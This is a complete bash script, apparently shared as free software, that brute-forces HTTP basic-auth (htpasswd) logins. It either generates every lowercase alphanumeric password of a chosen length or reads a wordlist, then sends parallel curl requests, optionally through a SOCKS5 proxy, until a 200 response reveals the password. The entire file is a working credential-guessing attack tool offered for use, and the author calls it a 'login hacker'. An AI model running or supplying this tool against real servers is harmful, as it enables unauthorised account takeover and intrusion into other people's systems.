#!/usr/bin/env bash

# alpha2 v1.0
# written by Marc Carlson June 18, 2022
# bash parallel htpasswd bruteforcer. Tries all possible alphanumeric combinations based on the number of characters.
# also has an option to use a password file instead.
# this is free software. free to use, free to redistribute. Do whatever you like with it.
# if you want to add support for uppercase letters, add {A..Z} to the character set.
# note: 6 alphanumeric characters (no uppercase) generates 2.25 billion possibilities!

charset=({a..z} {0..9})

count=1

usage() {
echo "   Usage: ./alpha2.sh [pcautxwhv] [options]"
echo "  -c  Number of characters to use for password permutation"
echo "  -a  IP address of remote target. For subfolders, be sure to use /folder/"
echo "  -u  Username to use"
echo "  -t  Number of threads to use"
echo "  -p  socks5 proxy address"
echo "  -w  use the password list instead. /path/to/list."
echo "  -v  alpha2 version number"
echo "  -x  test permutation function. -x followed by number of characters"
}

get_args() {
[ $# -eq 0 ] && usage && exit
while getopts "xp:a:u:t:c:hw:v" arg; do
case $arg in
a) ip="$OPTARG" ;;
u) user="$OPTARG" ;;
t) threads="$OPTARG" ;;
c) characters="$OPTARG" ;;
p) proxy="--socks5 $OPTARG" ;;
x) permutate=1 ;;
w) wordlist="$OPTARG"  ;;
v) version && exit ;;
h) usage && exit ;;
esac
done
}

type -P parallel 1>/dev/null
[ "$?" -ne 0 ] && echo "Please install GNU parallel before using this script." && exit

version() {
printf "alpha2 version 1.0 parallel http login hacker\n"
}

# Credit to pskocik for permutation function based on a post at stackexchange -> https://unix.stackexchange.com/users/23692/pskocik


permute(){
(($1 == 0)) && { echo "$2"; return; }
for char in "${charset[@]}"
do
permute "$((${1} - 1 ))" "$2$char"
done
}

bruteforce() {
permute $characters | parallel -j $threads -q curl -s -o /dev/null -w '%{http_code} {}\n' $proxy $ip -u $user:{} |\
awk '{if($1 == "200") {print "Found Password: " $2; exit} else if ($1 == "000") { print "Exit with code 000"; exit}\
else if ($1 =="403") { print "Exit with code 403"; exit}}'
}

get_args $@
if [[ $permutate == 1 ]]; then permute $2 && exit; fi
if [ -z $characters ] && [ $wordlist ]; then
parallel -j $threads -q curl -s -o /dev/null -w '%{http_code} {}\n' $proxy $ip -u $user:{} :::: $wordlist |\
awk '{if($1 == "200") {print "Found Password: " $2; exit} else if ($1 == "000") { print "Exit with code 000"; exit}\
else if ($1 =="403") { print "Exit with code 403"; exit}}'
exit
fi
bruteforce
